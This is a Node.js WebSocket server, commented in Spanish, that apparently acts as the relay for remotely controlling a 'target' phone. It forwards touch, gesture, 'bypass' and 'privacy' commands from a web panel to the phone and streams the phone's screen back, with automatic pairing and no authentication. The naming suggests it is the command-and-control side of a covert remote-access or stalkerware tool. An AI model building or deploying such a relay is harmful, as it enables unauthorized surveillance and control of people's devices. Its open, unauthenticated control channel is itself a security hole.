const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Servir archivos estáticos (el panel web en public/)
app.use(express.static(path.join(__dirname, 'public')));

// Instancias globales para conexión única directa (sin PIN)
let celularObjetivo = null;
let panelWebControlador = null;

wss.on('connection', (ws) => {
  let tipoCliente = null; // 'CELULAR' o 'WEB'

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);

      // 1. EL CELULAR SE REGISTRA AUTOMÁTICAMENTE COMO OBJETIVO
      if (data.type === 'REGISTRAR_OBJETIVO') {
        tipoCliente = 'CELULAR';
        celularObjetivo = ws;
        celularObjetivo.width = data.width || 1080;
        celularObjetivo.height = data.height || 2400;

        console.log(`[CELULAR CONECTADO] Resolución registrada: ${celularObjetivo.width}x${celularObjetivo.height}`);

        // Si la web ya estaba esperando, le avisamos de inmediato que hay conexión exitosa
        if (panelWebControlador && panelWebControlador.readyState === WebSocket.OPEN) {
          panelWebControlador.send(JSON.stringify({
            type: 'CONEXION_EXITOSA',
            width: celularObjetivo.width,
            height: celularObjetivo.height
          }));
        }
      }

      // 2. EL PANEL WEB SE CONECTA DE FORMA AUTOMÁTICA
      else if (data.type === 'CONECTAR_DESDE_WEB_AUTO') {
        tipoCliente = 'WEB';
        panelWebControlador = ws;

        if (celularObjetivo && celularObjetivo.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({
            type: 'CONEXION_EXITOSA',
            width: celularObjetivo.width,
            height: celularObjetivo.height
          }));
          console.log(`[PANEL WEB CONECTADO] Vinculado automáticamente al celular.`);
        } else {
          ws.send(JSON.stringify({
            type: 'ERROR',
            mensaje: 'Esperando a que el celular se conecte...'
          }));
          console.log(`[PANEL WEB CONECTADO] Esperando celular objetivo...`);
        }
      }

      // 3. REENVIAR ACCIONES TÁCTILES Y COMANDOS DE CONTROL (DEL WEB AL CELULAR)
      else if (
        data.type === 'ENVIAR_TOQUE' || 
        data.type === 'ENVIAR_GESTO' || 
        data.type === 'SET_BYPASS' || 
        data.type === 'SET_BOTONES' || 
        data.type === 'SET_PRIVACIDAD' ||
        data.accion
      ) {
        if (celularObjetivo && celularObjetivo.readyState === WebSocket.OPEN) {
          celularObjetivo.send(message);
        }
      }

      // 4. REENVIAR STREAM DE VIDEO (DEL CELULAR AL WEB) OPTIMIZADO PARA FLUJO EN TIEMPO REAL
      else if (data.type === 'STREAM_FRAME') {
        if (panelWebControlador && panelWebControlador.readyState === WebSocket.OPEN) {
          
          // Filtro de fluidez: si hay más de 64KB acumulados en la cola de red de la PC,
          // descartamos este frame para que nunca se atrase el video (cámara lenta).
          if (panelWebControlador.bufferedAmount > 65536) {
            return;
          }

          panelWebControlador.send(JSON.stringify({
            type: 'STREAM_FRAME',
            frame: data.frame
          }));
        }
      }
    } catch (err) {
      console.error("Error al procesar mensaje:", err);
    }
  });

  ws.on('close', () => {
    if (tipoCliente === 'CELULAR') {
      console.log(`[CELULAR DESCONECTADO] Sesión liberada.`);
      celularObjetivo = null;
      // Notificar a la web si está abierta
      if (panelWebControlador && panelWebControlador.readyState === WebSocket.OPEN) {
        panelWebControlador.send(JSON.stringify({
          type: 'ERROR',
          mensaje: 'El celular se ha desconectado.'
        }));
      }
    } else if (tipoCliente === 'WEB') {
      console.log(`[PANEL WEB DESCONECTADO].`);
      panelWebControlador = null;
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Servidor iniciado en el puerto ${PORT}`);
});
